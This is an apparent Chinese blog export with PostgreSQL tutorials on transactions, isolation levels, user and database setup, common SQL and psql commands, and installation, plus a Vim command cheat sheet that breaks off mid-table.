<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">SQL</span>语句<span class="number">1</span>;</span><br><span class="line"><span class="keyword">SQL</span>语句<span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>
<p>事务块是指包围在BEGIN和COMMIT之间的语句。在PostgreSQL9中，常用的事务块管理语句含义如下：</p>
<blockquote>
<p><strong>START TRANSACTION</strong>：此命令表示开始一个新的事务块.<br><strong>BEGIN</strong>：初始化一个事务块。在BEGIN命令后的语句都将在一个事务里面执行，知道遇见COMMIT或ROLLBACK。它和START TRANSACTION是一样的。<br><strong>COMMIT</strong>：提交事务。<br><strong>ROLLBACK</strong>：事务失败时执行回滚操作。<br><strong>SET TRANSACTION</strong>：设置当前事务的特性。对后面的事务没有影响。</p>
</blockquote>
<h3 id="事务隔离及并发控制"><a href="#事务隔离及并发控制" class="headerlink" title="事务隔离及并发控制"></a>事务隔离及并发控制</h3><p>PostgreSQL是一个支持多用户的数据库，当多个用户操作同一数据库时，并发控制要保证所有用户可以高效的访问的同时不破坏数据的完整性。</p>
<p>数据库中数据的并发操作经常发生，而对数据的并发操作会带来下面的一些问题：</p>
<ol>
<li>脏读<br>一个事务读取了另一个未提交事务写入的数据。</li>
<li>不可重复读<br>一个事务重新读取前面读取过的数据，发现该数据已经被另一个已经提交的事务修改。</li>
<li>幻读<br>一个事务重新执行一个查询，返回符合查询条件的行的集合，发现满足查询条件的行的集合因为其它最近提交的事务而发生了改变。</li>
</ol>
<p>SQL标准定义了四个级别的事务隔离。</p>
<p>| 隔离级别 | 脏读 | 幻读 | 不可重复性读取 |<br>| :- | :- |<br>|读未提交    |可能    |可能    |可能|<br>|读已提交    |不可能|    可能    |可能|<br>|可重复读    |不可能    |可能    |不可能|<br>|可串行读    |不可能    |不可能    |不可能|</p>
<p>在PostgreSQL中，可以请求4种隔离级别中的任意一种。但是在内部，实际上只有两种独立的隔离级别，分别对应已提交和可串行化。如果选择了读未提交的级别，实际上使用的是读已提交，在选择可重复读级别的时候，实际上用的是可串行化，所以实际的隔离级别可能比选择的更严格。这是SQL标准允许的：4种隔离级别只定义了哪种现象不能发生，但是没有定义哪种现象一定发生。</p>
<p>PostgreSQL只提供两种隔离级别的原因是，这是把标准的隔离级别与多版本并发控制架构映射相关的唯一合理方法。</p>
<ol>
<li>读已提交<br>这是PostgreSQL中默认的隔离级别，当一个事务运行在这个隔离级别时，一个SELECT查询只能看到查询开始前已提交的数据，而无法看到未提交的数据或者在查询期间其他的事务已提交的数据。</li>
<li>可串行化<br>可串行化提供最严格的事务隔离。这个级别模拟串行的事务执行，就好像事务是一个接着一个串行的执行。不过，这个级别的应用必须准备在串行化失败的时候重新启动事务。</li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL初体验</title>
    <url>//PostgreSQL-1</url>
    <content><![CDATA[<h2 id="创建操作系统用户"><a href="#创建操作系统用户" class="headerlink" title="创建操作系统用户"></a>创建操作系统用户</h2><p>创建一个新的Linux用户：dbuser</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> adduser dbuser <span class="comment">#创建一个新的Linux用户：dbuser</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="登录PostgreSQL控制台"><a href="#登录PostgreSQL控制台" class="headerlink" title="登录PostgreSQL控制台"></a>登录PostgreSQL控制台</h2><p>切换到postgres用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> su - postgres <span class="comment">#切换到postgres用户</span></span><br></pre></td></tr></table></figure>
<p>系统用户postgres以同名数据库用户的身份，登录数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$psql</span> <span class="comment">#系统用户postgres以同名数据库用户的身份，登录数据库</span></span><br></pre></td></tr></table></figure>
<p>成功登录到控制台后，显示 <code>postgres=#</code></p>
<blockquote>
<p>注意：后面分号不能省略</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\password postgres <span class="comment">#给postgres用户设置密码</span></span><br></pre></td></tr></table></figure>
<p>创建数据库用户dbuser</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CREATE USER dbuser WITH PASSWORD <span class="string">&#x27;dbuser&#x27;</span>; <span class="comment">#创建数据库用户dbuser</span></span><br></pre></td></tr></table></figure>
<p>创建用户数据库，这里为exampledb，并指定所有者为dbuser。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE exampledb OWNER dbuser; <span class="comment">#创建用户数据库，这里为exampledb，并指定所有者为dbuser。</span></span><br></pre></td></tr></table></figure>
<p>将exampledb数据库的所有权限都赋予dbuser</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON DATABASE exampledb to dbuser; <span class="comment">#将exampledb数据库的所有权限都赋予dbuser</span></span><br></pre></td></tr></table></figure>
<p>推出控制台（也可以直接按ctrl+D）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\q <span class="comment">#退出控制台</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL常用SQL操作</title>
    <url>//postgres-sql-use</url>
    <content><![CDATA[<blockquote>
<p>说明：文章中实例均在 <code>PostgreSQL</code> 环境操作。</p>
</blockquote>
<h2 id="DDL数据定义语言"><a href="#DDL数据定义语言" class="headerlink" title="DDL数据定义语言"></a>DDL数据定义语言</h2><h3 id="数据库-角色-schema"><a href="#数据库-角色-schema" class="headerlink" title="数据库/角色/schema"></a>数据库/角色/schema</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建一个数据库用户</span></span><br><span class="line"><span class="keyword">create</span> role &quot;sp-boss&quot; createdb createrole login password <span class="string">&#x27;sp-boss&#x27;</span>;</span><br><span class="line"><span class="comment">-- 使用上面角色登录 postgres 数据库</span></span><br><span class="line">psql <span class="operator">-</span>U sp<span class="operator">-</span>boss <span class="operator">-</span>d postgres</span><br><span class="line"><span class="comment">-- 创建自己的数据库</span></span><br><span class="line"><span class="keyword">create</span> database &quot;sp-boss&quot;</span><br><span class="line"><span class="comment">-- 登录自己的数据库</span></span><br><span class="line">psql <span class="operator">-</span>U sp<span class="operator">-</span>boss</span><br><span class="line"><span class="comment">-- 创建一个其他用户</span></span><br><span class="line"><span class="keyword">create</span> role &quot;sp-manager&quot; login password <span class="string">&#x27;sp-manager&#x27;</span>;</span><br><span class="line"><span class="comment">-- 赋予 create 权限</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">create</span> <span class="keyword">on</span> database &quot;sp-boss&quot; <span class="keyword">to</span> &quot;sp-manager&quot;;</span><br><span class="line"><span class="comment">-- 使用 新用户 登录数据库</span></span><br><span class="line">psql <span class="operator">-</span>U sp<span class="operator">-</span>manager <span class="operator">-</span>d sp<span class="operator">-</span>boss</span><br><span class="line"><span class="comment">-- 创建自己的 schema</span></span><br><span class="line"><span class="keyword">create</span> schema &quot;sp-manager&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--创建表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> user_info (</span><br><span class="line">  id serial <span class="keyword">primary</span> key,</span><br><span class="line">  name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">  age <span class="type">integer</span>,</span><br><span class="line">  create_time <span class="type">timestamp</span>,</span><br><span class="line">  type <span class="type">integer</span>,</span><br><span class="line">  display <span class="type">boolean</span> <span class="keyword">default</span> <span class="literal">true</span>,</span><br><span class="line">  <span class="keyword">unique</span> (name, type)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--删除表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">exists</span> user_info;</span><br><span class="line"><span class="comment">--重命名表</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> user_info rename <span class="keyword">to</span> user_infos;</span><br></pre></td></tr></table></figure>
<h3 id="字段（列）"><a href="#字段（列）" class="headerlink" title="字段（列）"></a>字段（列）</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--添加一列</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> user_info <span class="keyword">add</span> [<span class="keyword">column</span>] username <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"><span class="comment">--删除一列</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> user_info <span class="keyword">drop</span> [<span class="keyword">column</span>] username;</span><br><span class="line"><span class="comment">--重命名列</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> user_info rename [<span class="keyword">column</span>] username <span class="keyword">to</span> name;</span><br><span class="line"><span class="comment">--修改结构</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> user_info <span class="keyword">alter</span> [<span class="keyword">column</span>] username <span class="keyword">set</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<h3 id="唯一约束"><a href="#唯一约束" class="headerlink" title="唯一约束"></a>唯一约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 添加名为 uk_name 的联合唯一约束，组合列为column1和column2</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_theme <span class="keyword">add</span> <span class="keyword">constraint</span> uk_name <span class="keyword">unique</span>(column1,column2);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除名为 uk_name 的约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_theme <span class="keyword">drop</span> <span class="keyword">constraint</span> uk_name;</span><br></pre></td></tr></table></figure>

<h2 id="DML数据库操作语言"><a href="#DML数据库操作语言" class="headerlink" title="DML数据库操作语言"></a>DML数据库操作语言</h2><h3 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h3><h4 id="查询包含json格式的text类型的数据"><a href="#查询包含json格式的text类型的数据" class="headerlink" title="查询包含json格式的text类型的数据"></a>查询包含json格式的text类型的数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person;</span><br><span class="line"> id <span class="operator">|</span>  name  <span class="operator">|</span>                          other                           </span><br><span class="line"><span class="comment">----+--------+----------------------------------------------------------</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> faker  <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;male&quot;,&quot;address&quot;:&quot;xiamen&quot;,&quot;college&quot;:&quot;xmut&quot;&#125;</span><br><span class="line">  <span class="number">2</span> <span class="operator">|</span> watson <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;male&quot;,&quot;address&quot;:&quot;shenzhen&quot;,&quot;college&quot;:&quot;szu&quot;&#125;</span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span> lance  <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;male&quot;,&quot;address&quot;:&quot;shenzhen&quot;,&quot;college&quot;:&quot;xmut&quot;&#125;</span><br><span class="line">  <span class="number">4</span> <span class="operator">|</span> jine   <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;female&quot;,&quot;address&quot;:&quot;xiamen&quot;,&quot;college&quot;:&quot;xmut&quot;&#125;</span><br><span class="line">  <span class="number">5</span> <span class="operator">|</span> jobs   <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;male&quot;,&quot;address&quot;:&quot;beijing&quot;,&quot;college&quot;:&quot;xmu&quot;&#125;</span><br><span class="line">  <span class="number">6</span> <span class="operator">|</span> yak    <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;female&quot;,&quot;address&quot;:&quot;xiamen&quot;,&quot;college&quot;:&quot;xmut&quot;&#125;</span><br><span class="line">  <span class="number">7</span> <span class="operator">|</span> alice  <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;female&quot;,&quot;address&quot;:&quot;shanghai&quot;,&quot;college&quot;:&quot;thu&quot;&#125;</span><br><span class="line">  <span class="number">8</span> <span class="operator">|</span> anita  <span class="operator">|</span> &#123;&quot;gender&quot;:&quot;female&quot;,&quot;address&quot;:&quot;xiongan&quot;,&quot;college&quot;:&quot;hku&quot;&#125;</span><br><span class="line">(<span class="number">8</span> 行记录)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询深圳学生的高校分部情况</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">  other::json<span class="operator">-</span><span class="operator">&gt;&gt;</span><span class="string">&#x27;college&#x27;</span> college,</span><br><span class="line">  <span class="built_in">count</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  person</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  other::json<span class="operator">-</span><span class="operator">&gt;&gt;</span><span class="string">&#x27;address&#x27;</span><span class="operator">=</span><span class="string">&#x27;shenzhen&#x27;</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">  other::json<span class="operator">-</span><span class="operator">&gt;&gt;</span><span class="string">&#x27;college&#x27;</span>;</span><br><span class="line">___________________________</span><br><span class="line">  college <span class="operator">|</span> count</span><br><span class="line"> <span class="comment">---------+-------</span></span><br><span class="line">  szu     <span class="operator">|</span>     <span class="number">1</span></span><br><span class="line">  xmut    <span class="operator">|</span>     <span class="number">1</span></span><br><span class="line"> (<span class="number">1</span> 行记录)</span><br><span class="line"><span class="comment">--- 结果可得深圳一共有两个学生，</span></span><br><span class="line"><span class="comment">--- 在深圳大学和厦门理工学院各一个。</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>postgres</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL常用操作</title>
    <url>//PostgreSQL-2</url>
    <content><![CDATA[<h2 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\h: <span class="comment">#查看SQL命令的解释，比如\h select。</span></span><br><span class="line">\?: <span class="comment">#查看psql命令列表。</span></span><br><span class="line">\l: <span class="comment">#列出所有数据库。</span></span><br><span class="line">\c [database_name]: <span class="comment">#连接其他数据库。</span></span><br><span class="line">\d: <span class="comment">#列出当前数据库的所有表格。</span></span><br><span class="line">\d [table_name]: <span class="comment">#列出某一张表格的结构。</span></span><br><span class="line">\du: <span class="comment">#列出所有用户。</span></span><br><span class="line">\e: <span class="comment">#打开文本编辑器。</span></span><br><span class="line">\conninfo: <span class="comment">#列出当前数据库和连接的信息。</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>基本的数据库操作，就是使用一般的SQL语言</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 创建新表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> user_tbl(name <span class="type">VARCHAR</span>(<span class="number">20</span>), signup_date <span class="type">DATE</span>);</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> user_tbl(name, signup_date) <span class="keyword">VALUES</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;2013-12-22&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 选择记录</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_tbl;</span><br><span class="line"></span><br><span class="line"># 更新数据</span><br><span class="line">UPDATE user_tbl <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;李四&#x27;</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 删除记录</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> user_tbl <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;李四&#x27;</span> ;</span><br><span class="line"></span><br><span class="line"># 添加栏位</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_tbl <span class="keyword">ADD</span> email <span class="type">VARCHAR</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"># 更新结构</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_tbl <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> signup_date <span class="keyword">SET</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"># 更名栏位</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_tbl RENAME <span class="keyword">COLUMN</span> signup_date <span class="keyword">TO</span> signup;</span><br><span class="line"></span><br><span class="line"># 删除栏位</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_tbl <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> email;</span><br><span class="line"></span><br><span class="line"># 表格更名</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_tbl RENAME <span class="keyword">TO</span> backup_tbl;</span><br><span class="line"></span><br><span class="line"># 删除表格</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> backup_tbl;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL的介绍与安装</title>
    <url>//PostgreSQL-3</url>
    <content><![CDATA[<p>由于工作认识了PostgreSQL，在此系统学习一下这个数据库，本文除博主实践所得以外，大量译于 <a href="https://www.postgresql.org/docs/9.6/static/">官方文档</a></p>
<h2 id="PostgreSQL是什么"><a href="#PostgreSQL是什么" class="headerlink" title="PostgreSQL是什么"></a>PostgreSQL是什么</h2><blockquote>
<p>PostgreSQL 是一个基于 <code>POSTGRES, Version 4.2</code> 的对象关系数据库系统（ORDBMS），由加州大学伯克利分校计算机科学系开发。<br>PostgreSQL 是一个开源的数据库，因为自由许可，任何人都可以免费的使用、修改、分发 PostgreSQL 数据库用于任何目的。</p>
</blockquote>
<span id="more"></span>
<p><strong>它支持大部分的SQL标准并提供了许多流行的功能：</strong></p>
<ol>
<li>复杂查询（complex queries）</li>
<li>外键（foreign keys）</li>
<li>触发器（triggers）</li>
<li>可更新的视图（updatable views）</li>
<li>事务完整性（transactional integrity）</li>
<li>多版本并发控制（multiversion concurrency control）</li>
</ol>
<p><strong>用户也可以给PostgreSQL扩展很多东西，比如：</strong></p>
<ol>
<li>数据类型（data types）</li>
<li>函数（functions）</li>
<li>运算符（operators）</li>
<li>聚合函数（aggregate functions）</li>
<li>索引方法（index methods）</li>
</ol>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="博主开发环境："><a href="#博主开发环境：" class="headerlink" title="博主开发环境："></a>博主开发环境：</h3><ul>
<li>系统 ：深度Linux 15.3 桌面版</li>
<li>PostgreSQL ：9.4</li>
</ul>
<h3 id="通过apt-get安装"><a href="#通过apt-get安装" class="headerlink" title="通过apt-get安装"></a>通过apt-get安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt-get install postgresql-9.4</span><br></pre></td></tr></table></figure>
<p>仓库有许多不同的包（包括第三方插件），最常见、最重要的包（根据需要替换版本号）：</p>
<ol>
<li>postgresql-client-9.4 - 客户端库和二进制文件</li>
<li>postgresql-9.4 - 核心数据库服务器</li>
<li>postgresql-contrib-9.4 - 提供额外的模块</li>
<li>libpq-dev - C语言前端开发库和头文件</li>
<li>postgresql-server-dev-9.4 - C语言后端开发库和头文件</li>
<li>pgadmin3 - pgAdmin III 图形化管理工具</li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim命令速查表</title>
    <url>//Vim-command</url>
    <content><![CDATA[<p>去年上半年开始全面使用linux进行开发和娱乐了，现在已经回不去windows了。</p>
<p>话归正传，在linux上一直使用vim，慢慢熟悉了它的命令，才终于领悟了什么是编辑器之神。</p>
<p>最近抽空整理了这份速查表，收获颇丰，并分享给大家。</p>
<h2 id="进入vim"><a href="#进入vim" class="headerlink" title="进入vim"></a>进入vim</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">vim filename</td>
<td align="left">打开或新建文件,并将光标置于第一行首</td>
</tr>
<tr>
<td align="left">vim +n filename</td>
<td align="left">打开文件，并将光标置于第n行首</td>
</tr>
<tr>
<td align="left">vim + filename</td>
<td align="left">打开文件，并将光标置于最后一行首</td>
</tr>
<tr>
<td align="left">vim +/pattern filename</td>
<td align="left">打开文件，并将光标置于第一个与pattern匹配的串处</td>
</tr>
<tr>
<td align="left">vim -r filename</td>
<td align="left">在上次正用vim编辑时发生系统崩溃，恢复filename</td>
</tr>
<tr>
<td align="left">vim filename….filename</td>
<td align="left">打开多个文件，依次编辑</td>
</tr>
</tbody></table>
<h2 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">all</td>
<td align="left">列出所有选项设置情况</td>
</tr>
<tr>
<td align="left">term</td>
<td align="left">设置终端类型</td>
</tr>
<tr>
<td align="left">ignorance</td>
<td align="left">在搜索中忽略大小写</td>
</tr>
<tr>
<td align="left">list</td>
<td align="left">显示制表位(Ctrl+I)和行尾标志（$)</td>
</tr>
<tr>
<td align="left">number</td>
<td align="left">显示行号</td>
</tr>
<tr>
<td align="left">report</td>
<td align="left">显示由面向行的命令修改过的数目</td>
</tr>
<tr>
<td align="left">terse</td>
<td align="left">显示简短的警告信息</td>
</tr>
<tr>
<td align="left">warn</td>
<td align="left">在转到别的文件时若没保存当前文件则显示NO write信息</td>
</tr>
<tr>
<td align="left">nomagic</td>
<td align="left">允许在搜索模式中，使用前面不带“\”的特殊字符</td>
</tr>
<tr>
<td align="left">nowrapscan</td>
<td align="left">禁止vi在搜索到达文件两端时，又从另一端开始</td>
</tr>
<tr>
<td align="left">mesg</td>
<td align="left">允许vi显示其他用户用write写到自己终端上的信息</td>
</tr>
<tr>
<td align="left">:set number / set nonumber</td>
<td align="left">显示/不显示行号</td>
</tr>
<tr>
<td align="left">:set ruler /set noruler</td>
<td align="left">显示/不显示标尺</td>
</tr>
<tr>
<td align="left">:set hlsearch</td>
<td align="left">高亮显示查找到的单词</td>
</tr>
<tr>
<td align="left">:set nohlsearch</td>
<td align="left">关闭高亮显示</td>
</tr>
<tr>
<td align="left">:syntax on</td>
<td align="left">语法高亮</td>
</tr>
<tr>
<td align="left">:set nu</td>
<td align="left">显示行号</td>
</tr>
<tr>
<td align="left">:set ignorecase</td>
<td align="left">搜索时忽略大小写</td>
</tr>
<tr>
<td align="left">:set smartcase</td>
<td align="left">搜索时匹配大小写</td>
</tr>
<tr>
<td align="left">:set ruler</td>
<td align="left">显示光标位置坐标</td>
</tr>
<tr>
<td align="left">:set hlsearch</td>
<td align="left">搜索匹配全高亮</td>
</tr>
<tr>
<td align="left">:set tabstop=8</td>
<td align="left">设置tab大小,8为最常用最普遍的设置</td>
</tr>
<tr>
<td align="left">:set softtabstop=8</td>
<td align="left">4:4个空格,8:正常的制表符,12:一个制表符4个空格,16:两个制表符</td>
</tr>
<tr>
<td align="left">:set autoindent</td>
<td align="left">自动缩进</td>
</tr>
<tr>
<td align="left">:set cindent</td>
<td align="left">C语言格式里面的自动缩进</td>
</tr>
</tbody></table>
<h2 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">k nk</td>
<td align="left">上 向上移动n行</td>
</tr>
<tr>
<td align="left">j nj</td>
<td align="left">下 向下移动n行</td>
</tr>
<tr>
<td align="left">h nh</td>
<td align="left">左 向左移动n行</td>
</tr>
<tr>
<td align="left">l nl</td>
<td align="left">右 向右移动n行</td>
</tr>
<tr>
<td align="left">Space</td>
<td align="left">光标右移一个字符</td>
</tr>
<tr>
<td align="left">Backspace</td>
<td align="left">光标左移一个字符</td>
</tr>
<tr>
<td align="left">Enter</td>
<td align="left">光标下移一行</td>
</tr>
<tr>
<td align="left">w/W</td>
<td align="left">光标右移一个字至字首</td>
</tr>
<tr>
<td align="left">b/B</td>
<td align="left">光标左移一个字至字首</td>
</tr>
<tr>
<td align="left">e或E</td>
<td align="left">光标右移一个字至字尾</td>
</tr>
<tr>
<td align="left">)</td>
<td align="left">光标移至句尾</td>
</tr>
<tr>
<td align="left">(</td>
<td align="left">光标移至句首</td>
</tr>
<tr>
<td align="left">}</td>
<td align="left">光标移至段落开头</td>
</tr>
<tr>
<td align="left">{</td>
<td align="left">光标移至段落结尾</td>
</tr>
<tr>
<td align="left">n$</td>
<td align="left">光标移至第n行尾</td>
</tr>
<tr>
<td align="left">H</td>
<td align="left">光标移至屏幕顶行</td>
</tr>
<tr>
<td align="left">M</td>
<td align="left">光标移至屏幕中间行</td>
</tr>
<tr>
<td align="left">L</td>
<td align="left">光标移至屏幕最后行</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">（注意是数字零）光标移至当前行首</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">移动光标到行首第一个非空字符上去</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">光标移至当前行尾</td>
</tr>
<tr>
<td align="left">gg</td>
<td align="left">移到第一行</td>
</tr>
<tr>
<td align="left">G</td>
<td align="left">移到最后一行</td>
</tr>
<tr>
<td align="left">f<a></td>
<td align="left">移动光标到当前行的字符a上</td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">相反</td>
</tr>
<tr>
<td align="left">%</td>
<td align="left">移动到与制匹配的括号上去（），{}，[]，&lt;&gt;等</td>
</tr>
<tr>
<td align="left">nG</td>
<td align="left">移动到第n行上</td>
</tr>
<tr>
<td align="left">G</td>
<td align="left">到最后一行</td>
</tr>
</tbody></table>
<h2 id="屏幕滚动"><a href="#屏幕滚动" class="headerlink" title="屏幕滚动"></a>屏幕滚动</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Ctrl+e</td>
<td align="left">向文件首翻一行</td>
</tr>
<tr>
<td align="left">Ctrl+y</td>
<td align="left">向文件尾翻一行</td>
</tr>
<tr>
<td align="left">Ctrl+u</td>
<td align="left">向文件首翻半屏</td>
</tr>
<tr>
<td align="left">Ctrl+d</td>
<td align="left">向文件尾翻半屏</td>
</tr>
<tr>
<td align="left">Ctrl+f</td>
<td align="left">向文件尾翻一屏</td>
</tr>
<tr>
<td align="left">Ctrl+b</td>
<td align="left">向文件首翻一屏</td>
</tr>
<tr>
<td align="left">nz</td>
<td align="left">将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部</td>
</tr>
</tbody></table>
<h2 id="插入文本类"><a href="#插入文本类" class="headerlink" title="插入文本类"></a>插入文本类</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">在光标前</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">在当前行首</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">光标后</td>
</tr>
<tr>
<td align="left">A</td>
<td align="left">在当前行尾</td>
</tr>
<tr>
<td align="left">o</td>
<td align="left">在当前行之下新开一行</td>
</tr>
<tr>
<td align="left">O</td>
<td align="left">在当前行之上新开一行</td>
</tr>
<tr>
<td align="left">r</td>
<td align="left">替换当前字符</td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">替换当前字符及其后的字符，直至按ESC键</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">从当前光标位置处开始，以输入的文本替代指定数目的字符</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">删除指定数目的行，并以所输入文本代替之</td>
</tr>
<tr>
<td align="left">ncw/nCW</td>
<td align="left">修改指定数目的字</td>
</tr>
<tr>
<td align="left">nCC</td>
<td align="left">修改指定数目的行</td>
</tr>
</tbody></table>
<h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x/X</td>
<td align="left">删除一个字符，x删除光标后的，而X删除光标前的</td>
</tr>
<tr>
<td align="left">dw</td>
<td align="left">删除一个单词(删除光标位置到下一个单词开始的位置)</td>
</tr>
<tr>
<td align="left">dnw</td>
<td align="left">删除n个单词</td>
</tr>
<tr>
<td align="left">dne</td>
<td align="left">也可，只是删除到单词尾</td>
</tr>
<tr>
<td align="left">do</td>
